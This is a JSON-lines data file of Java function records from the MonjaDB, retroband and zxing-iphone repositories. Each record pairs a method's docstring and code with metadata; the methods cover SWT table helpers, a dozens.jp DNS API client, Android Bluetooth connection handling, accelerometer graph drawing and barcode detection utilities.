{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public static void getTreeColumnWidthFromProperties( String prefix, Tree tree, MProperties prop, int defaultWidth )", "code": "{\ntry\n\t{\n\tTreeColumn[] columns = tree.getColumns();\n\tfor( int i = 0; i < columns.length; ++i )\n\t\t{\n\t\tcolumns[ i ].setWidth( prop.getIntProperty( prefix + \".treeColumnWidth\" + Integer.toString( i ), defaultWidth ) );\n\t\t}\n\t}\ncatch( Exception e )\n\t{\n\te.printStackTrace();\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public Map updateRecord( String recordId, String fieldName, String value )\nthrows IOException", "code": "{\n// /api/record/update/{record_id}.json\nMap data = new HashMap();\ndata.put( fieldName, value );\n\n//debug\n//data.put( \"prio\", new Integer( 10 ) );\n//data.put( \"ttl\", \"7200\" );\n\nMap header = new HashMap();\nheader.put( \"X-Auth-Token\", authToken );\nMap result = callApi( \"/api/record/update/\" + recordId + \".json\", header, JSON.encode( data ) );\nreturn result;\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void copyToClipboard( String s )", "code": "{\nDisplay display = Display.findDisplay( Thread.currentThread() );\nClipboard clipboard = new Clipboard( display );\nTextTransfer textTransfer = TextTransfer.getInstance();\nclipboard.setContents(new Object[]{ s }, new Transfer[]{ textTransfer } );\nclipboard.dispose();\n/*\n \tClipboard clipboard = new Clipboard(display);\n\t\tString textData = \"Hello World\";\n\t\tString rtfData = \"{\\\\rtf1\\\\b\\\\i Hello World}\";\n\t\tTextTransfer textTransfer = TextTransfer.getInstance();\n\t\tRTFTransfer rtfTransfer = RTFTransfer.getInstance();\n\t\tclipboard.setContents(new Object[]{textData, rtfData}, new Transfer[]{textTransfer, rtfTransfer});\n\t\tclipboard.dispose();\n*/\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public static void removeMenuItems( Menu menu )", "code": "{\nMenuItem[] items = menu.getItems();\nfor( int i = 0; i < items.length; ++i )\n\t{\n\titems[ i ].dispose();\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void addListenerToTreeColumns2( Tree tree, Listener listener )", "code": "{\nTreeColumn[] columns = tree.getColumns();\nfor( int i = 0; i < columns.length; ++i )\n\t{\n\tcolumns[ i ].addListener( SWT.Resize, listener );\n\tcolumns[ i ].addListener( SWT.Selection, listener );\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public Map getZone()\nthrows IOException", "code": "{\nMap header = new HashMap();\nheader.put( \"X-Auth-Token\", authToken );\nMap result = callApi( \"/api/zone.json\", header );\nreturn result;\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public static void getTableColumnWidthFromProperties2( String prefix, Table table, MProperties prop )", "code": "{\nTableColumn[] columns = table.getColumns();\nif( columns.length > 0 )\n\t{\n\tgetTableColumnWidthFromProperties( prefix, table, prop, table.getBounds().width / columns.length );\n\t}\nelse\n\t{\n\tgetTableColumnWidthFromProperties( prefix, table, prop, 20 );\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void addListenerToTableColumns( Table table, Listener listener )", "code": "{\nTableColumn[] columns = table.getColumns();\nfor( int i = 0; i < columns.length; ++i )\n\t{\n\tcolumns[ i ].addListener( SWT.Resize, listener );\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void addListenerToMenuItems( Menu menu, Listener listener )", "code": "{\nMenuItem[] itemArray = menu.getItems();\nfor( int i = 0; i < itemArray.length; ++i )\n\t{\n\titemArray[ i ].addListener( SWT.Selection, listener );\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "// --------------------------------------------------------------------------------\n", "func_signal": "public static void getTableColumnWidthFromProperties( String prefix, Table table, MProperties prop, int[] defaultWidth )", "code": "{\nTableColumn[] columns = table.getColumns();\nif( columns.length > defaultWidth.length )\n\t{\n\tgetTableColumnWidthFromProperties(  prefix, table, prop, 20 );\n\t}\nelse\n\t{\n\tfor( int i = 0; i < columns.length; ++i )\n\t\t{\n\t\tcolumns[ i ].setWidth( prop.getIntProperty( prefix + \".columnWidth\" + Integer.toString( i ), defaultWidth[ i ] ) );\n\t\t}\n\t}\n}", "path": "src\\net\\jumperz\\gui\\MSwtUtil.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public Map addRecord( Map data )\nthrows IOException", "code": "{\nMap header = new HashMap();\nheader.put( \"X-Auth-Token\", authToken );\nMap result = callApi( \"/api/record/create.json\", header, JSON.encode( data ) );\nreturn result;\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public Map getRecord( String zoneName )\nthrows IOException", "code": "{\nMap header = new HashMap();\nheader.put( \"X-Auth-Token\", authToken );\nMap result = callApi( \"/api/record/\" + zoneName + \".json\", header );\nreturn result;\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "public Map deleteRecord( String recordId )\nthrows IOException", "code": "{\n// /api/record/delete/{record_id}.json\nMap header = new HashMap();\nheader.put( \"X-Auth-Token\", authToken );\nMap result = callApi( \"/api/record/delete/\" + recordId + \".json\", header );;\nreturn result;\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "//--------------------------------------------------------------------------------\n", "func_signal": "private Map callApi( String apiPath, Map header, String body )\nthrows IOException", "code": "{\nURL url = new URL( \"http://dozens.jp\" + apiPath );\nURLConnection conn = url.openConnection();\nHttpURLConnection urlConn = ( HttpURLConnection )conn;\nIterator p = header.keySet().iterator();\nwhile( p.hasNext() )\n\t{\n\tString key = ( String )p.next();\n\tString value = ( String )header.get( key );\n\tconn.addRequestProperty( key, value );\n\t//debug( key + \":\" + value );\n\t}\nconn.addRequestProperty( \"Connection\", \"close\" );\n\nif( apiPath.indexOf( \"delete\" ) > -1 )\n\t{\n\turlConn.setRequestMethod( \"DELETE\" );\n\t}\n\nif( body != null )\n\t{\n\tconn.setDoOutput( true );\n\tconn.setRequestProperty( \"Content-Type\", \"application/json\" );\n\tOutputStream out = conn.getOutputStream();\n\tout.write( body.getBytes( \"ISO-8859-1\" ) );\n\tout.close();\n\t}\n\nint statusCode = urlConn.getResponseCode();\nif( statusCode != 200 )\n\t{\n\tthrow new IOException( \"API failed: \" + urlConn.getResponseMessage() );\n\t}\n\nString responseBody = MStreamUtil.streamToString( conn.getInputStream() );\nObject resultObj = JSON.decode( responseBody );\nif( resultObj instanceof Map )\n\t{\n\treturn ( Map )resultObj;\n\t}\nelse\n\t{\n\treturn new HashMap();\n\t}\n}", "path": "src\\net\\jumperz\\net\\dozens\\MSession.java", "repo_name": "Kanatoko/MonjaDB", "stars": 71, "license": "None", "language": "java", "size": 1034}
{"docstring": "/**\n * Automatically retry bluetooth connection.\n */\n", "func_signal": "private void reserveRetryConnect()", "code": "{\n\tif(mIsServiceStopped)\n\t\treturn;\n\t\n    mReconnectDelay = mReconnectDelay * 2;\n    if(mReconnectDelay > RECONNECT_DELAY_MAX)\n    \tmReconnectDelay = RECONNECT_DELAY_MAX;\n    \n\t\tif(mConnectTimer != null) {\n\t\t\ttry {\n\t\t\t\tmConnectTimer.cancel();\n\t\t\t} catch (IllegalStateException e) {\n\t\t\t\te.printStackTrace();\n\t\t\t}\n\t\t}\n\t\tmConnectTimer = new Timer();\n\t\tmConnectTimer.schedule(new ConnectTimerTask(), mReconnectDelay);\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Start the ConnectThread to initiate a connection to a remote device.\n * @param device  The BluetoothDevice to connect\n */\n", "func_signal": "public synchronized void connect(BluetoothDevice device)", "code": "{\n    Log.d(TAG, \"Connecting to: \" + device);\n    \n    if (mState == STATE_CONNECTED)\n    \treturn;\n\n    // Cancel any thread attempting to make a connection\n    if (mState == STATE_CONNECTING) {\n        if (mConnectThread != null) {mConnectThread.cancel(); mConnectThread = null;}\n    }\n\n    // Cancel any thread currently running a connection\n    if (mConnectedThread != null) {mConnectedThread.cancel(); mConnectedThread = null;}\n\n    // Start the thread to connect with the given device\n    mConnectThread = new ConnectThread(device);\n    mConnectThread.start();\n    setState(STATE_CONNECTING);\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Indicate that the connection was lost and notify the UI Activity.\n */\n", "func_signal": "private void connectionLost()", "code": "{\n\tLog.d(TAG, \"BluetoothManager :: connectionLost()\");\n    setState(STATE_LISTEN);\n\n    // Send a failure message back to the Activity\n    // WARNING: This makes too many toast.\n    /*\n    Message msg = mHandler.obtainMessage(MESSAGE_TOAST);\n    Bundle bundle = new Bundle();\n    bundle.putString(SERVICE_HANDLER_MSG_KEY_TOAST, \"Device connection was lost\");\n    msg.setData(bundle);\n    mHandler.sendMessage(msg);\n    */\n    \n    // Reserve re-connect timer\n    reserveRetryConnect();\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Start the chat service. Specifically start AcceptThread to begin a\n * session in listening (server) mode. Called by the Activity onResume() */\n", "func_signal": "public synchronized void start()", "code": "{\n    Log.d(TAG, \"Starting BluetoothManager...\");\n\n    // Cancel any thread attempting to make a connection\n    if (mConnectThread != null) {mConnectThread.cancel(); mConnectThread = null;}\n\n    // Cancel any thread currently running a connection\n    if (mConnectedThread != null) {mConnectedThread.cancel(); mConnectedThread = null;}\n\n    // Start the thread to listen on a BluetoothServerSocket\n    if (mAcceptThread == null) {\n        mAcceptThread = new AcceptThread();\n        mAcceptThread.start();\n    }\n    setState(STATE_LISTEN);\n    mIsServiceStopped = false;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Start the ConnectedThread to begin managing a Bluetooth connection\n * @param socket  The BluetoothSocket on which the connection was made\n * @param device  The BluetoothDevice that has been connected\n */\n", "func_signal": "public synchronized void connected(BluetoothSocket socket, BluetoothDevice device)", "code": "{\n\tLog.d(TAG, \"connected\");\n\n    // Cancel the thread that completed the connection\n    if (mConnectThread != null) {mConnectThread.cancel(); mConnectThread = null;}\n\n    // Cancel any thread currently running a connection\n    if (mConnectedThread != null) {mConnectedThread.cancel(); mConnectedThread = null;}\n\n    // Cancel the accept thread because we only want to connect to one device\n    if (mAcceptThread != null) {mAcceptThread.cancel(); mAcceptThread = null;}\n\n    // Start the thread to manage the connection and perform transmissions\n    mConnectedThread = new ConnectedThread(socket);\n    mConnectedThread.start();\n\n    // Send the name of the connected device back to the UI Activity\n    Message msg = mHandler.obtainMessage(MESSAGE_DEVICE_NAME);\n    Bundle bundle = new Bundle();\n    bundle.putString(SERVICE_HANDLER_MSG_KEY_DEVICE_ADDRESS, device.getAddress());\n    bundle.putString(SERVICE_HANDLER_MSG_KEY_DEVICE_NAME, device.getName());\n    msg.setData(bundle);\n    mHandler.sendMessage(msg);\n\n    setState(STATE_CONNECTED);\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Draw line\n * @param color\t\tcolor type\n * @param point_x1\tstarting point x\n * @param point_x2\tend point x2\n * @param value1\tstarting point y\n * @param value2\tend point y2\n */\n", "func_signal": "private void drawLine(int color, int point_x1, int point_x2, float value1, float value2)", "code": "{\n\t\n\tswitch(color) {\n\t\tcase TYPE_GREEN:\n\t\t\tmPaint.setColor(0xFFFF0000);\t// Green\n\t\t\tbreak;\n\t\tcase TYPE_BLUE:\n\t\t\tmPaint.setColor(0xFF0000FF);\t// Blue\n\t\t\tbreak;\n\t\tcase TYPE_RED:\n\t\t\tmPaint.setColor(0xFF00CC00);\t// Red\n\t\t\tbreak;\n\t}\n\t\n\tfloat height1 = mViewH - value1*mVerticalScale;\n\tfloat height2 = mViewH - value2*mVerticalScale;\n\tmCanvas.drawLine(point_x1, height1, \n\t\t\tpoint_x2, height2, \n\t\t\tmPaint);\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Single pattern\n */\n", "func_signal": "public synchronized static ConnectionInfo getInstance(Context c)", "code": "{\n\tif(mInstance == null) {\n\t\tif(c != null)\n\t\t\tmInstance = new ConnectionInfo(c);\n\t\telse\n\t\t\treturn null;\n\t}\n\treturn mInstance;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\ConnectionInfo.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Write to the connected OutStream.\n * @param buffer  The bytes to write\n */\n", "func_signal": "public void write(byte[] buffer)", "code": "{\n    try {\n        mmOutStream.write(buffer);\n\n        // Disabled: Share the sent message back to the main thread\n        // mHandler.obtainMessage(Constants.MESSAGE_WRITE, -1, -1, buffer)\n        //        .sendToTarget();\n    } catch (IOException e) {\n        Log.e(TAG, \"Exception during write\");\n    }\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Set the current state of the chat connection\n * @param state  An integer defining the current connection state\n */\n", "func_signal": "private synchronized void setState(int state)", "code": "{\n    Log.d(TAG, \"setState() \" + mState + \" -> \" + state);\n    mState = state;\n    \n    if(mState == STATE_CONNECTED)\n    \tcancelRetryConnect();\n\n    // Give the new state to the Handler so the UI Activity can update\n    mHandler.obtainMessage(MESSAGE_STATE_CHANGE, state, -1).sendToTarget();\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/*****************************************************\n*\t\tInitialization methods\n******************************************************/\n/*\n * Use this when you make rendering view from source code\n */\n", "func_signal": "public RenderingView(Context context)", "code": "{\n\tsuper(context);\n\tmContext = context;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Remember device name for future use\n * @param name\t\tdevice name\n */\n", "func_signal": "public void setDeviceName(String name)", "code": "{\n\tmDeviceName = name;\n\t\n\t// At this time, connection is established successfully.\n\t// Save connection info in shared preference.\n\tSharedPreferences prefs = mContext.getSharedPreferences(Constants.PREFERENCE_NAME, Context.MODE_PRIVATE);\n\tSharedPreferences.Editor editor = prefs.edit();\n\teditor.putString(Constants.PREFERENCE_CONN_INFO_ADDRESS, mDeviceAddress);\n\teditor.putString(Constants.PREFERENCE_CONN_INFO_NAME, mDeviceName);\n\teditor.commit();\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\ConnectionInfo.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Stop all threads\n */\n", "func_signal": "public synchronized void stop()", "code": "{\n    Log.d(TAG, \"stop\");\n    if (mConnectThread != null) {mConnectThread.cancel(); mConnectThread = null;}\n    if (mConnectedThread != null) {mConnectedThread.cancel(); mConnectedThread = null;}\n    if (mAcceptThread != null) {mAcceptThread.cancel(); mAcceptThread = null;}\n    setState(STATE_NONE);\n    \n    mIsServiceStopped = true;\n    cancelRetryConnect();\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/*****************************************************\n*\t\tPublic methods\n******************************************************/\n/**\n * Initialize graphics\n * @param max_val\tMax value range from bottom to top\n */\n", "func_signal": "public void initializeGraphics(float max_val)", "code": "{\n\tmViewW = this.getWidth();\n\tmViewH = this.getHeight();\n\tif(max_val <= 0) {\n\t\tmMaxValue = mViewH/2;\n\t\tmVerticalScale = 1;\n\t} else {\n\t\tmMaxValue = max_val;\n\t\tmVerticalScale = (float)(mViewH)/(2f*max_val);\n\t}\n\t\n\t// Initialize graphics\n\tmBitmap = Bitmap.createBitmap(mViewW, mViewH, Bitmap.Config.ARGB_8888);\n\tmPaint = new Paint();\n\tmPaint.setAntiAlias(false);\n\t// TODO: for enhanced effects\n\t//mPaint.setDither(true);\n\t//mPaint.setColor(0xFFFF0000);\n\t//mPaint.setStyle(Paint.Style.STROKE);\n\t//mPaint.setStrokeJoin(Paint.Join.ROUND);\n\t//mPaint.setStrokeCap(Paint.Cap.ROUND);\n\t//mPaint.setStrokeWidth(12);\n\t// mEmboss = new EmbossMaskFilter(new float[] { 1, 1, 1 }, 0.4f, 6, 3.5f);\n\t// mBlur = new BlurMaskFilter(8, BlurMaskFilter.Blur.NORMAL);\n\t\n\tmCanvas = new Canvas(mBitmap);\n\t\n\t// Draw guide line\n\tmPaint.setColor(0xFFb1b1b1);\n\tmCanvas.drawLine(0, mViewH/2, \n\t\t\tmViewW, mViewH/2, \n\t\t\tmPaint);\n\t\n\tmIsInitialized = true;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Draw accel data on canvas\n * @param accel\t\taccel data array\n */\n", "func_signal": "public void drawAccelGraph(int[] accel)", "code": "{\n\tif(accel == null || accel.length < 3)\n\t\treturn;\n\t\n\tif(bStart == true) {\n\t\tPrevDrawingX = mCurrentDrawingX;\n\t\tbStart = false;\n\t\treturn;\n\t}\n\n\tfor(int i=3; i<accel.length; i+=3) {\n\t\t// x axis value is Red dot\n\t\tdrawPoint(TYPE_RED, mCurrentDrawingX, accel[i] + mMaxValue);\n\t\tdrawLine(TYPE_RED, PrevDrawingX, mCurrentDrawingX, accel[i-3] + mMaxValue, accel[i] + mMaxValue);\n\t\t\n\t\t// y axis value is Blue dot\n\t\tdrawPoint(TYPE_GREEN, mCurrentDrawingX, accel[i+1] + mMaxValue);\n\t\tdrawLine(TYPE_GREEN, PrevDrawingX, mCurrentDrawingX, accel[i-2] + mMaxValue, accel[i+1] + mMaxValue);\n\t\t\n\t\t// z axis value is Green dot\n\t\tdrawPoint(TYPE_BLUE, mCurrentDrawingX, accel[i+2] + mMaxValue);\n\t\tdrawLine(TYPE_BLUE, PrevDrawingX, mCurrentDrawingX, accel[i-1] + mMaxValue, accel[i+2] + mMaxValue);\n\t\tif( mCurrentDrawingX + POINT_WIDTH_HALF >= mViewW ) {\n\t\t\tPrevDrawingX = moveTimeLine();\n\t\t} else {\n\t\t\tPrevDrawingX = mCurrentDrawingX;\n\t\t\tmCurrentDrawingX += POINT_WIDTH*2;\n\t\t}\n\t}\n\t\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/*****************************************************\n*\t\tOverride methods\n******************************************************/\n", "func_signal": "@Override\nprotected void onDraw(Canvas canvas)", "code": "{\n\tsuper.onDraw(canvas);\n\t\n\tif(mBitmap != null)\n\t\tcanvas.drawBitmap(mBitmap, 0, 0, null);\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Clear canvas. Initialize drawing point X\n */\n", "func_signal": "private void resetGraphics()", "code": "{\n\tmCanvas.drawColor(Color.WHITE);\n\tmCurrentDrawingX = 1 + POINT_WIDTH_HALF;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Write to the ConnectedThread in an unsynchronized manner\n * @param out The bytes to write\n * @see ConnectedThread#write(byte[])\n */\n", "func_signal": "public void write(byte[] out)", "code": "{\n    // Create temporary object\n    ConnectedThread r;\n    // Synchronize a copy of the ConnectedThread\n    synchronized (this) {\n        if (mState != STATE_CONNECTED) return;\n        r = mConnectedThread;\n    }\n    // Perform the write unsynchronized\n    r.write(out);\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Draw a point on canvas\n * @param color\t\tcolor type\n * @param point_x\tpoint x\n * @param value\t\tpoint y\n */\n", "func_signal": "private void drawPoint(int color, int point_x, float value)", "code": "{\n\t\n\tswitch(color) {\n\t\tcase TYPE_GREEN:\n\t\t\tmPaint.setColor(0xFFFF0000);\t// Green\n\t\t\tbreak;\n\t\tcase TYPE_BLUE:\n\t\t\tmPaint.setColor(0xFF0000FF);\t// Blue\n\t\t\tbreak;\n\t\tcase TYPE_RED:\n\t\t\tmPaint.setColor(0xFF00CC00);\t// Red\n\t\t\tbreak;\n\t}\n\t\n\tfloat height = mViewH - value*mVerticalScale;\n\tif(POINT_THICKNESS == 1) {\n\t\tmCanvas.drawLine(point_x - POINT_WIDTH_HALF, height, \n\t\t\t\tpoint_x + POINT_WIDTH_HALF, height, \n\t\t\t\tmPaint);\n\t} else {\n\t\tmCanvas.drawRect(point_x - POINT_WIDTH_HALF, height + POINT_THICKNESS_HALF, \n\t\t\t\tpoint_x + POINT_WIDTH_HALF, height - POINT_THICKNESS_HALF, \n\t\t\t\tmPaint);\n\t}\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\fragments\\RenderingView.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Reset connection info\n */\n", "func_signal": "public void resetConnectionInfo()", "code": "{\n\tmDeviceAddress = null;\n\tmDeviceName = null;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\ConnectionInfo.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * Constructor. Prepares a new BluetoothChat session.\n * @param context  The UI Activity Context\n * @param handler  A Handler to send messages back to the UI Activity\n */\n", "func_signal": "public BluetoothManager(Context context, Handler handler)", "code": "{\n    mAdapter = BluetoothAdapter.getDefaultAdapter();\n    mState = STATE_NONE;\n    mHandler = handler;\n}", "path": "Android\\RetroBand\\src\\com\\hardcopy\\retroband\\bluetooth\\BluetoothManager.java", "repo_name": "godstale/retroband", "stars": 83, "license": "apache-2.0", "language": "java", "size": 821}
{"docstring": "/**\n * <p>Estimates module size (pixels in a module) based on the Start and End\n * finder patterns.</p>\n *\n * @param vertices an array of vertices:\n *           vertices[0] x, y top left barcode\n *           vertices[1] x, y bottom left barcode\n *           vertices[2] x, y top right barcode\n *           vertices[3] x, y bottom right barcode\n *           vertices[4] x, y top left codeword area\n *           vertices[5] x, y bottom left codeword area\n *           vertices[6] x, y top right codeword area\n *           vertices[7] x, y bottom right codeword area\n * @return the module size.\n */\n", "func_signal": "private static float computeModuleWidth(ResultPoint[] vertices)", "code": "{\n  float pixels1 = ResultPoint.distance(vertices[0], vertices[4]);\n  float pixels2 = ResultPoint.distance(vertices[1], vertices[5]);\n  float moduleWidth1 = (pixels1 + pixels2) / (17 * 2.0f);\n  float pixels3 = ResultPoint.distance(vertices[6], vertices[2]);\n  float pixels4 = ResultPoint.distance(vertices[7], vertices[3]);\n  float moduleWidth2 = (pixels3 + pixels4) / (18 * 2.0f);\n  return (moduleWidth1 + moduleWidth2) / 2.0f;\n}", "path": "core\\src\\com\\google\\zxing\\pdf417\\detector\\Detector.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Reverses all bits in the array.\n */\n", "func_signal": "public void reverse()", "code": "{\n  int[] newBits = new int[bits.length];\n  int size = this.size;\n  for (int i = 0; i < size; i++) {\n    if (get(size - i - 1)) {\n      newBits[i >> 5] |= 1 << (i & 0x1F);\n    }\n  }\n  bits = newBits;\n}", "path": "core\\src\\com\\google\\zxing\\common\\BitArray.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Determines how closely a set of observed counts of runs of black/white values matches a given\n * target pattern. This is reported as the ratio of the total variance from the expected pattern\n * proportions across all pattern elements, to the length of the pattern.\n *\n * @param counters observed counters\n * @param pattern expected pattern\n * @param maxIndividualVariance The most any counter can differ before we give up\n * @return ratio of total variance between counters and pattern compared to total pattern size,\n *  where the ratio has been multiplied by 256. So, 0 means no variance (perfect match); 256 means\n *  the total variance between counters and patterns equals the pattern length, higher values mean\n *  even more variance\n */\n", "func_signal": "protected static int patternMatchVariance(int[] counters, int[] pattern, int maxIndividualVariance)", "code": "{\n  int numCounters = counters.length;\n  int total = 0;\n  int patternLength = 0;\n  for (int i = 0; i < numCounters; i++) {\n    total += counters[i];\n    patternLength += pattern[i];\n  }\n  if (total < patternLength) {\n    // If we don't even have one pixel per unit of bar width, assume this is too small\n    // to reliably match, so fail:\n    return Integer.MAX_VALUE;\n  }\n  // We're going to fake floating-point math in integers. We just need to use more bits.\n  // Scale up patternLength so that intermediate values below like scaledCounter will have\n  // more \"significant digits\"\n  int unitBarWidth = (total << INTEGER_MATH_SHIFT) / patternLength;\n  maxIndividualVariance = (maxIndividualVariance * unitBarWidth) >> INTEGER_MATH_SHIFT;\n\n  int totalVariance = 0;\n  for (int x = 0; x < numCounters; x++) {\n    int counter = counters[x] << INTEGER_MATH_SHIFT;\n    int scaledPattern = pattern[x] * unitBarWidth;\n    int variance = counter > scaledPattern ? counter - scaledPattern : scaledPattern - counter;\n    if (variance > maxIndividualVariance) {\n      return Integer.MAX_VALUE;\n    }\n    totalVariance += variance;\n  }\n  return totalVariance / total;\n}", "path": "core\\src\\com\\google\\zxing\\oned\\OneDReader.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Logs the given message at the info level.\n */\n", "func_signal": "public static void info(String message)", "code": "{\n  EventLogger.logEvent(LOG_ID_LONG, message.getBytes(), EventLogger.INFORMATION);\n  logToSystemOut(message);\n}", "path": "rim\\src\\com\\google\\zxing\\client\\rim\\util\\Log.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
{"docstring": "/**\n * Logs the given message to system.out.\n * This is useful when debugging on the simulator.\n */\n", "func_signal": "private static void logToSystemOut(String message)", "code": "{\n  if (logToSystemOut) {\n    System.out.println(message);\n  }\n}", "path": "rim\\src\\com\\google\\zxing\\client\\rim\\util\\Log.java", "repo_name": "joelind/zxing-iphone", "stars": 83, "license": "apache-2.0", "language": "java", "size": 71870}
